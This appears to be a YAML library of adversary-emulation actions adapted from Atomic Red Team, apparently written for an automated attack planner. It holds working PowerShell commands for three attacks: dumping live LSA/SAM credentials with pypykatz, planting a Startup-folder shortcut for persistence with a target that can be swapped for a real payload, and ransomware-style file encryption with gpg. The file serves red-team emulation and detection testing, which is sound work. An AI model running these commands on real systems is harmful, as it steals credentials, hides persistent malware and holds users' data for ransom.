  - uuid: art-t1003_002-pypykatz-live-lsa
    name: Registry parse with pypykatz
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      `pypykatz live lsa` reads live LSA / SAM state and prints hashes and
      cached secrets to stdout. Method 3 folds the heavy prereq chain
      (install Python, create venv, pip install pypykatz) — this fold is
      expensive on first run; realistic simulation envs would pre-provision
      Python. ART auto_generated_guid a96872b2-cbf3-46cf-8eb4-27e8c0e85263.
    execution:
      executor: Powershell Executor
      command: |
        $venv = "#{venv_path}"
        if (-not (Test-Path "$venv\Scripts\pypykatz.exe")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          if (-not (Get-Command py -ErrorAction Ignore)) {
            $pySetup = "$env:TEMP\python_setup.exe"
            Invoke-WebRequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -OutFile $pySetup
            Start-Process $pySetup -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1' -Wait
          }
          py -m venv $venv
          & "$venv\Scripts\pip.exe" install --no-cache-dir pypykatz | Out-Null
        }
        & "$venv\Scripts\pypykatz.exe" live lsa
    arguments:
      executor:
        description: The Powershell session ID used to invoke pypykatz.
        required: true
        pddl_index: executor2_var_in_plan
      venv_path:
        default: C:\Users\Public\venv_pypykatz
        description: Target-side path to a Python venv containing pypykatz.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-startup-folder-lnk
    name: Add Executable Shortcut Link to User Startup Folder
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      File-based Startup persistence: creates a `.lnk` shortcut in the
      current user's `Startup` folder pointing at the chosen executable.
      Native Windows shell (WScript.Shell) — no external binary. Original
      ART test hardcodes calc.exe as the target; parameterised here so
      operators can substitute a real payload. ART auto_generated_guid
      24e55612-85f6-4bd6-ae74-a73d02e3441d.
    execution:
      executor: Powershell Executor
      command: |
        $Target = "#{target_path}"
        $ShortcutLocation = "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\#{shortcut_name}"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $Create = $WScriptShell.CreateShortcut($ShortcutLocation)
        $Create.TargetPath = $Target
        $Create.Save()
    arguments:
      executor:
        description: The Powershell session ID used to create the .lnk file.
        required: true
        pddl_index: executor2_var_in_plan
      target_path:
        default: C:\Windows\System32\calc.exe
        description: Full path to the executable the shortcut launches at login.
        required: true
        pddl_index: string1_var_in_plan
      shortcut_name:
        default: ArtPersist.lnk
        description: Filename of the .lnk placed under the Startup folder.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: art-t1486-gpg4win-encrypt
    name: Data Encrypted with GPG4Win
    id:
      - T1486
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - Data Encrypted for Impact
    description: |
      Uses GPG4Win's gpg.exe with a symmetric passphrase to encrypt a target
      file — mirrors ransomware pattern of "encrypt user data with a key
      attacker controls". Requires GnuPG installed at the standard path
      (present on many admin workstations, absent on hardened targets;
      operator responsibility to provision). ART auto_generated_guid
      4541e2c2-33c8-44b1-be79-9161440f1718.
    execution:
      executor: Powershell Executor
      command: |
        if (-not (Test-Path "#{file_to_encrypt}")) {
          Set-Content -Path "#{file_to_encrypt}" -Value "populating this file with some text"
        }
        & "#{gpg_exe}" --passphrase "#{passphrase}" --batch --yes -c "#{file_to_encrypt}"
    arguments:
      executor:
        description: The Powershell session ID used to invoke gpg.exe.
        required: true
        pddl_index: executor2_var_in_plan
      gpg_exe:
        default: C:\Program Files (x86)\GnuPG\bin\gpg.exe
        description: Full path to gpg.exe on target.
        required: true
      file_to_encrypt:
        default: $env:TEMP\test.txt
        description: Target-side path to the file GPG will encrypt.
        required: true
      passphrase:
        default: SomeParaphraseBlah
        description: Symmetric encryption passphrase (attacker keeps this to demand
          ransom).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
    effects:
      - (data-encrypted ?d - data ?target - host)
